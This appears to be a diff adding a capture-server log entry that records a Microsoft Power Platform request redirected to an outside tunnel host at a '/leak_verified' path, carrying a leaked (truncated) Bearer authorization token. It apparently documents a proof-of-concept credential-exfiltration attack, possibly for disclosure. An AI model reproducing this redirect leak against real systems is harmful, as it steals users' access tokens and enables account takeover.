@@ -1,0 +1,7 @@
+[2026-03-14 15:07:19] [CAPTURE_NODE_01] INBOUND REDIRECT LEAK
+----------------------------------------------------------------
+SOURCE_IP: [REDACTED_FOR_SECURITY]
+TARGET_URI: http://22f2f1647fc9fc.lhr.life/leak_verified
+USER_AGENT: Mozilla/5.0 (Microsoft Power Platform Runtime)
+LEAKED_HEADER: Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...[TRUNCATED_SENSITIVE_DATA]
+----------------------------------------------------------------
